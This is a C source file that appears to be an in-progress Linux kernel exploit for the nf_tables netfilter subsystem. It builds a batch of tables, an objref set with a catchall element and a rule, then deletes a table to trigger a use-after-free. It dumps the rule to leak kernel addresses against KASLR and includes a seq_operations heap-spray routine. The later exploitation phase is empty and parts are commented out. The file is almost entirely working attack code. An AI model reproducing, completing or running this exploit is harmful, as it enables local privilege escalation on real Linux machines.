#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/ip.h>
#include <errno.h>
#include <sched.h>
#include <ctype.h>
#include <pthread.h>
#include <fcntl.h>
#include <unistd.h>
#include <stddef.h>
#include <time.h>
#include <signal.h>
#include <sys/resource.h>
#include <linux/netfilter.h>
#include <libnftnl/chain.h>
#include <libnftnl/table.h>
#include <libnftnl/rule.h>
#include <libnftnl/set.h>
#include <libnftnl/object.h>
#include <libnftnl/expr.h>
#include <libmnl/libmnl.h>
#include <linux/netfilter/nf_tables.h>

#define MAX_FDS 1024

char *table1_name = "table1";
char *table2_name = "table2";
char *obj_name = "obj1";
char *set_name = "set1";
char *chain_name = "chain2";

uint64_t so_leaked_addr = 0;

/* Hexdump utility for debugging purposes */
void hexdump(void *mem, unsigned int len) {
        unsigned int i = 0, j = 0;

        for(i = 0; i < len + ((len % 16) ? (16 - len % 16) : 0); i++) {
                if(i % 16 == 0)
                        printf("0x%06x: ", i);

                if(i < len)
                        printf("%02x ", 0xFF & ((char*)mem)[i]);
                else
                        printf("   ");

                if(i % 16 == (16 - 1)) {
                        for(j = i - (16 - 1); j <= i; j++) {
                                if(j >= len)
                                        putchar(' ');
                                else if(isprint(((char*)mem)[j]))
                                        putchar(0xFF & ((char*)mem)[j]);
                                else
                                        putchar('.');
                        }
                        putchar('\n');
                }
        }
        return;
}


static int leak_ASLR(struct nftnl_expr *e, void *cbdata)
{
        const char *data;
        uint32_t kfree_relative;
        uint64_t kfree_hi;
        uint64_t kfree_low;
        uint64_t offset;

        puts("leak_ASLR");
        data = nftnl_expr_get_str(e, NFTNL_EXPR_OBJREF_SET_NAME);
        printf ("data: 0x%llx\n", data);
        // hexdump(data, 512);
        // kfree_relative = *(uint32_t *)data;
        // offset = kfree_relative;
        // printf("[+] kfree_relative: %p\n", (void *)offset);
        //   kfree_hi = ((uint64_t)nf_tables + NF_TABLES_KFREE_CALL + 4) & 0xffffffff00000000llu;
        //   kfree_low = (uint64_t)nf_tables + NF_TABLES_KFREE_CALL + 4 + kfree_relative;
        //   void *kfree = (void *)(kfree_hi + (kfree_low & 0xffffffff));
        //   printf("[+] kfree: %p\n", kfree);
        //   vmlinux = (void *)(kfree - KFREE_OFFSET);

        return MNL_CB_OK;
}

/* Delete a netfilter table */
void delete_table(char *table_name)
{
        struct mnl_socket *s = NULL;
        struct mnl_nlmsg_batch *batch = NULL;
        struct nlmsghdr *nh = NULL;
        int r = 0;
        int seq = 0;
        char buf[16384] = { 0 };
        struct nftnl_table *table = NULL;

        // assign_to_core(DEF_CORE);

        s = mnl_socket_open(NETLINK_NETFILTER);
        if (!s) {
                perror("[-] Failed to create netfilter socket");
        }

        table = nftnl_table_alloc();
        nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

        batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                         NFT_MSG_DELTABLE, NFPROTO_IPV4,
                                         NLM_F_CREATE, seq++);
        nftnl_table_nlmsg_build_payload(nh, table);
        mnl_nlmsg_batch_next(batch);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch),
                              mnl_nlmsg_batch_size(batch));
        if (r < 0)
                perror("[-] Failed to send message");

        return;
}

/* Repeat a char n times and return a string */
char *str_repeat(char c, size_t n)
{
        char *ptr = calloc(n + 1, sizeof(char));
        if (!ptr) {
                perror("[-] Error at calloc()");
        }

        for (int i = 0; i < n; i++)
                ptr[i] = c;

        return ptr;
}

void create_UAF(struct mnl_socket *nl)
{
        struct mnl_socket *s = nl;
        struct mnl_nlmsg_batch *batch;
        struct nlmsghdr *nh;
        char buf[16384];
        int r;
        int seq = 0;

        /* Create table that will be deleted */

        struct nftnl_table *table1 = NULL;
        table1 = nftnl_table_alloc();
        nftnl_table_set_str(table1, NFTNL_TABLE_NAME, table1_name);

        /* Create table where an object reference will be */

        struct nftnl_table *table2 = NULL;
        table2 = nftnl_table_alloc();
        nftnl_table_set_str(table2, NFTNL_TABLE_NAME, table2_name);

        /* Create obj1 to table1 */
        char *klk_obj_name = str_repeat('X', 0x20 - 2);
        struct nftnl_obj *obj = nftnl_obj_alloc();
        nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, table1_name);
        nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, klk_obj_name);
        nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_COUNTER);

        /* Create set and add it to table1 */

        struct nftnl_set *set = nftnl_set_alloc();
        nftnl_set_set_str(set, NFTNL_SET_TABLE, table1_name);
        nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
        nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 8);
        nftnl_set_set_u32(set, NFTNL_SET_ID, htonl(0xcafe));
        nftnl_set_set_u32(set, NFTNL_SET_FLAGS,
                          NFT_SET_OBJECT | NFT_SET_TIMEOUT); // NFT_SET_ANONYMOUS
        nftnl_set_set_u32(set, NFTNL_SET_OBJ_TYPE, NFT_OBJECT_COUNTER);
        nftnl_set_set_u32(set, NFTNL_SET_KEY_TYPE, 13);
        nftnl_set_set_u64(set, NFTNL_SET_TIMEOUT, 1500);
        nftnl_set_set_u32(set, NFTNL_SET_GC_INTERVAL, 2000);

        /* Create set element */
        struct nftnl_set_elem *se = NULL;
        se = nftnl_set_elem_alloc();
        nftnl_set_elem_set_str(se, NFTNL_SET_ELEM_OBJREF, klk_obj_name);
        // NFT_SET_ELEM_CATCHALL = 0x2
        nftnl_set_elem_set_u32(se, NFTNL_SET_ELEM_FLAGS, 0x2);

        /* Add set_elem into set */
        nftnl_set_elem_add(set, se);

        /* Create chain with chain_id */

        struct nftnl_chain *chain = nftnl_chain_alloc();
        nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);
        nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table2_name);
        nftnl_chain_set_u32(chain, NFTNL_CHAIN_ID, (0xdeadbeef));
        nftnl_chain_set_str(chain, NFTNL_CHAIN_TYPE, "filter");
        nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_INET_LOCAL_OUT);

        /* Add nft_rule to table */
        struct nftnl_rule *rule = nftnl_rule_alloc();
        // struct nftnl_udata_buf *udata = nftnl_udata_buf_alloc(NFT_USERDATA_MAXLEN); // 256
        nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table1_name);
        nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY,
                           NFPROTO_IPV4); // same family

        /* Add nft_expr into nft_rule*/
        struct nftnl_expr *expr = nftnl_expr_alloc("objref");
        nftnl_expr_set_str(expr, NFTNL_EXPR_OBJREF_SET_NAME, set_name);
        nftnl_expr_set_u32(expr, NFTNL_EXPR_OBJREF_SET_SREG,
                           NFT_REG32_00); //set register
        nftnl_rule_add_expr(rule, expr);

        /* So this must be in the same batch. */

        batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        // table 1
        nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                         NFT_MSG_NEWTABLE, NFPROTO_IPV4,
                                         NLM_F_CREATE, seq++);
        nftnl_table_nlmsg_build_payload(nh, table1);
        mnl_nlmsg_batch_next(batch);

        // table 2
        nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                         NFT_MSG_NEWTABLE, NFPROTO_IPV4,
                                         NLM_F_CREATE, seq++);
        nftnl_table_nlmsg_build_payload(nh, table2);
        mnl_nlmsg_batch_next(batch);

        // obj
        nh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWOBJ, NFPROTO_IPV4, NLM_F_CREATE,
                                seq++);
        nftnl_obj_nlmsg_build_payload(nh, obj);
        mnl_nlmsg_batch_next(batch);

        // set
        nh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                       NFT_MSG_NEWSET, NFPROTO_IPV4,
                                       NLM_F_CREATE, seq++);
        nftnl_set_nlmsg_build_payload(nh, set);
        mnl_nlmsg_batch_next(batch);

        // set element
        nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                      NFT_MSG_NEWSETELEM, NFPROTO_IPV4,
                                      NLM_F_CREATE, seq++);
        nftnl_set_elems_nlmsg_build_payload(nh, set);
        mnl_nlmsg_batch_next(batch);

        // chain
        nh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                         NFT_MSG_NEWCHAIN, NFPROTO_IPV4,
                                         NLM_F_CREATE, seq++);
        nftnl_chain_nlmsg_build_payload(nh, chain);
        mnl_nlmsg_batch_next(batch);

        // rule
        nh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                        NFT_MSG_NEWRULE, NFPROTO_IPV4,
                                        NLM_F_CREATE, seq++);
        nftnl_rule_nlmsg_build_payload(nh, rule);
        mnl_attr_put_u32(nh, 11, htonl(0xdeadbeef)); // NFTA_RULE_CHAIN_ID = 11
        mnl_nlmsg_batch_next(batch);

        // send
        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch),
                              mnl_nlmsg_batch_size(batch));
        if (r < 0) {
                perror("\t[-] failed to send message");
        }

        /* Delete table1 with the object */
        //     batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
        //     nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        //     mnl_nlmsg_batch_next(batch);

        //     nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELTABLE, NFPROTO_IPV4, NLM_F_CREATE,
        // seq++);
        //     nftnl_table_nlmsg_build_payload(nh, table1);
        //     mnl_nlmsg_batch_next(batch);

        //     nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        //     mnl_nlmsg_batch_next(batch);

        //     r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));

        /* Delete  table2 */
        //     batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
        //     nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        //     mnl_nlmsg_batch_next(batch);

        //     nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELTABLE, NFPROTO_IPV4, NLM_F_CREATE,
        // seq++);
        //     nftnl_table_nlmsg_build_payload(nh, table2);
        //     mnl_nlmsg_batch_next(batch);

        //     nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        //     mnl_nlmsg_batch_next(batch);

        //     r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));

        // =================================== leak ===================================
}

/* Modify process rlimit for RLIMIT_NOFILE */
void modify_rlimit(void)
{
        struct rlimit old_lim, lim, new_lim;

        if (getrlimit(RLIMIT_NOFILE, &old_lim) != 0) {
                puts("[-] Error in getrlimit()");
                exit(-1);
        }

        lim.rlim_cur = old_lim.rlim_max;
        lim.rlim_max = old_lim.rlim_max;

        if (setrlimit(RLIMIT_NOFILE, &lim) == -1) {
                puts("[-] Error at setrlimit()");
                exit(-1);
        }

        return;
}

/* Spray with seq_operations structs */
void spray_seq_op_loop(void)
{
        int fds[MAX_FDS] = { 0 };
        int i = 0;

        // assign_to_core(DEF_CORE);
        // puts("spray_seq_op_loop");

        modify_rlimit();

        while (i < MAX_FDS) {
                fds[i] = open("/proc/self/stat", O_RDONLY);
                i++;
        }
        return;
}

static int get_rule_cb(const struct nlmsghdr *nlh, void *data)
{
        struct nftnl_rule *r;

        puts("get_rule_cb");
        r = nftnl_rule_alloc();
        if (r == NULL) {
                perror("[-] nftnl_rule_alloc");
                goto err;
        }

        if (nftnl_rule_nlmsg_parse(nlh, r) < 0) {
                perror("[-] nftnl_rule_nlmsg_parse");
                goto err_free;
        }

        nftnl_expr_foreach(r, data, NULL);

err_free:
        nftnl_rule_free(r);
err:
        return MNL_CB_OK;
}

static int run_cb(struct mnl_socket *nl, uint32_t seq, mnl_cb_t cb_data,
                  void *data)
{
        char buf[MNL_SOCKET_BUFFER_SIZE];
        int ret;

        puts("run_cb");
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
                ret = mnl_cb_run(buf, ret, seq, mnl_socket_get_portid(nl),
                                 cb_data, data);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }

        hexdump(buf, 512);

        return ret;
}

static int dump_leak_rule(struct mnl_socket *nl,
                          int (*cb)(struct nftnl_expr *e, void *data))
{
        struct nftnl_rule *r;
        uint32_t seq;
        int ret;
        struct nlmsghdr *nlh;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nfgenmsg *nfg;

        r = nftnl_rule_alloc();
        if (r == NULL) {
                perror("[-] init_rule");
                return NULL;
        }

        nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
        nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table2_name);
        nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);

        nlh = nftnl_rule_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, NFPROTO_IPV4,
                                         NLM_F_DUMP, seq);
        nftnl_rule_nlmsg_build_payload(nlh, r);

        if (((ret = mnl_socket_sendto(nl, nlh, nlh->nlmsg_len))) < 0) {
                perror("[-] mnl_socket_sendto");
                return ret;
        }
        if ((ret = run_cb(nl, seq, get_rule_cb, cb)) < 0) {
                perror("[-] run_cb");
                return ret;
        }

        return 0;
}

int main()
{
        void *retval = NULL;
        pthread_t tx;
        struct mnl_socket *nl;

        nl = mnl_socket_open(NETLINK_NETFILTER);
        if (!nl) {
                perror("\t[-] failed to create netfilter socket");
        }
        /* ===================== [  Pre-cleanup ] ===================== */

        /* Remove exploit tables left from other executions */

        delete_table(table1_name);
        delete_table(table2_name);

        /* ===================== [ Phase 1 - KASLR Leak ] ===================== */

        puts("[i] Phase 1 - KASLR leak");
        puts("\t[*] Triggering UAF on nft_set struct...");
        create_UAF(nl);

        // pthread_create(&tx, NULL, (void *)spray_seq_op_loop, NULL);

        delete_table(table1_name);
        // puts("\t[*] Spraying with seq_operations structs...");

        // pthread_join(tx, &retval);

        // If we succeed in making a seq_operations struct be allocated right where
        // our obj->key.name string was, we will be able to leak the single_open()
        // address by requesting the object name through the map.

        // This though has another requirement, which is that obj is intact, so that
        // the pointer to the obj->key.name chunk is still existing.

        dump_leak_rule(nl, leak_ASLR);
        // so_leaked_addr =
        //      parse_uaf_obj_name_leak(table2_name, set_name, 0x40 + 12, 0);
        // if (so_leaked_addr == 0 ||
        //     (so_leaked_addr & 0xffff000000000000) != 0xffff000000000000) {
        //      delete_table(table2_name);
        //      perror("[-] single_open() leak failed!");
        // }

        /* ===================== [ Phase 2 - ... ] ===================== */

        return 0;
}%